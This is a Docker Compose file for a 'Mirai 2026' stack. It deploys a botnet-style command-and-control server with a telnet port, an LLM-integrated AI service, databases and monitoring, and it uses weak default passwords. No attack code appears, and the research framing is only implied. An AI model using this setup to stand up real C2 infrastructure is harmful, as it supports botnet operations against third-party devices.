version: '3.8'

# Mirai 2026 - Fixed Production-Ready Stack
# Optimized for Docker Desktop with proper health checks and resource limits

services:
  # PostgreSQL database
  postgres:
    image: postgres:16-alpine
    container_name: mirai-postgres
    environment:
      POSTGRES_DB: ${POSTGRES_DB:-mirai}
      POSTGRES_USER: ${POSTGRES_USER:-mirai}
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-research_password_change_me}
      POSTGRES_INITDB_ARGS: "-E UTF8"
    volumes:
      - postgres_data:/var/lib/postgresql/data
      - ./mirai/cnc/init-db.sql:/docker-entrypoint-initdb.d/init.sql:ro
    ports:
      - "${POSTGRES_PORT:-5433}:5432"
    networks:
      - mirai-net
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U mirai"]
      interval: 10s
      timeout: 5s
      retries: 5
    restart: unless-stopped
    deploy:
      resources:
        limits:
          cpus: '1'
          memory: 512M

  # Redis for caching
  redis:
    image: redis:7-alpine
    container_name: mirai-redis
    command: redis-server --appendonly yes --maxmemory 256mb --maxmemory-policy allkeys-lru
    ports:
      - "${REDIS_PORT:-6380}:6379"
    volumes:
      - redis_data:/data
    networks:
      - mirai-net
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 10s
      timeout: 3s
      retries: 5
    restart: unless-stopped
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 256M

  # AI/ML Service with LLM integration
  ai-service:
    build:
      context: .
      dockerfile: docker/Dockerfile.ai
    container_name: mirai-ai-service
    environment:
      - REDIS_URL=redis://redis:6379
      - DATABASE_URL=postgresql://mirai:research_password_change_me@postgres:5432/mirai
      - LOG_LEVEL=${LOG_LEVEL:-INFO}
      - PYTHONUNBUFFERED=1
      # LLM Configuration
      - OPENROUTER_API_KEY=${OPENROUTER_API_KEY:-}
      - OPENROUTER_MODEL=${OPENROUTER_MODEL:-openai/gpt-3.5-turbo}
      - OLLAMA_BASE_URL=${OLLAMA_BASE_URL:-http://host.docker.internal:11434}
      - OPENAI_API_KEY=${OPENAI_API_KEY:-}
      - ANTHROPIC_API_KEY=${ANTHROPIC_API_KEY:-}
    volumes:
      - ./ai:/app/ai:ro
      - ai_models:/models
      - ./ai/llm_integration/.env:/app/ai/llm_integration/.env:ro
    ports:
      - "${AI_SERVICE_PORT:-8001}:8000"
    networks:
      - mirai-net
    depends_on:
      postgres:
        condition: service_healthy
      redis:
        condition: service_healthy
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8000/health"]
      interval: 30s
      timeout: 10s
      retries: 3
    restart: unless-stopped
    deploy:
      resources:
        limits:
          cpus: '2'
          memory: 2G

  # C&C Server
  cnc:
    build:
      context: .
      dockerfile: docker/Dockerfile.cnc
    container_name: mirai-cnc
    environment:
      - DATABASE_URL=postgresql://mirai:research_password_change_me@postgres:5432/mirai
      - REDIS_URL=redis://redis:6379
      - AI_SERVICE_URL=http://ai-service:8000
    ports:
      - "${CNC_TELNET_PORT:-2323}:23"
      - "${CNC_API_PORT:-8080}:8080"
    networks:
      - mirai-net
    depends_on:
      postgres:
        condition: service_healthy
      redis:
        condition: service_healthy
      ai-service:
        condition: service_healthy
    restart: unless-stopped
    deploy:
      resources:
        limits:
          cpus: '1'
          memory: 512M

  # Prometheus for metrics
  prometheus:
    image: prom/prometheus:latest
    container_name: mirai-prometheus
    volumes:
      - ./observability/prometheus.yml:/etc/prometheus/prometheus.yml:ro
      - prometheus_data:/prometheus
    ports:
      - "${PROMETHEUS_PORT:-9090}:9090"
    command:
      - '--config.file=/etc/prometheus/prometheus.yml'
      - '--storage.tsdb.path=/prometheus'
      - '--storage.tsdb.retention.time=30d'
      - '--web.console.libraries=/usr/share/prometheus/console_libraries'
      - '--web.console.templates=/usr/share/prometheus/consoles'
    networks:
      - mirai-net
    restart: unless-stopped
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 512M

  # Grafana for dashboards
  grafana:
    image: grafana/grafana:latest
    container_name: mirai-grafana
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=${GRAFANA_ADMIN_PASSWORD:-admin}
      - GF_USERS_ALLOW_SIGN_UP=false
      - GF_SERVER_ROOT_URL=http://localhost:3010
      - GF_ANALYTICS_REPORTING_ENABLED=false
      - GF_ANALYTICS_CHECK_FOR_UPDATES=false
    volumes:
      - grafana_data:/var/lib/grafana
      - ./observability/grafana/dashboards:/etc/grafana/provisioning/dashboards:ro
      - ./observability/grafana/datasources:/etc/grafana/provisioning/datasources:ro
    ports:
      - "${GRAFANA_PORT:-3010}:3000"
    networks:
      - mirai-net
    depends_on:
      - prometheus
    restart: unless-stopped
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 256M

  # Loki for logs
  loki:
    image: grafana/loki:latest
    container_name: mirai-loki
    ports:
      - "${LOKI_PORT:-3100}:3100"
    volumes:
      - ./observability/loki-config.yml:/etc/loki/local-config.yaml:ro
      - loki_data:/loki
    networks:
      - mirai-net
    command: -config.file=/etc/loki/local-config.yaml
    restart: unless-stopped
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 512M

  # Jaeger for tracing
  jaeger:
    image: jaegertracing/all-in-one:latest
    container_name: mirai-jaeger
    environment:
      - COLLECTOR_ZIPKIN_HOST_PORT=:9411
      - MEMORY_MAX_TRACES=10000
    ports:
      - "5775:5775/udp"
      - "6831:6831/udp"
      - "6832:6832/udp"
      - "5778:5778"
      - "${JAEGER_UI_PORT:-16686}:16686"
      - "14268:14268"
      - "14250:14250"
      - "9411:9411"
    networks:
      - mirai-net
    restart: unless-stopped
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 512M

volumes:
  postgres_data:
  redis_data:
  prometheus_data:
  grafana_data:
  loki_data:
  ai_models:

networks:
  mirai-net:
    driver: bridge
    name: mirai-network
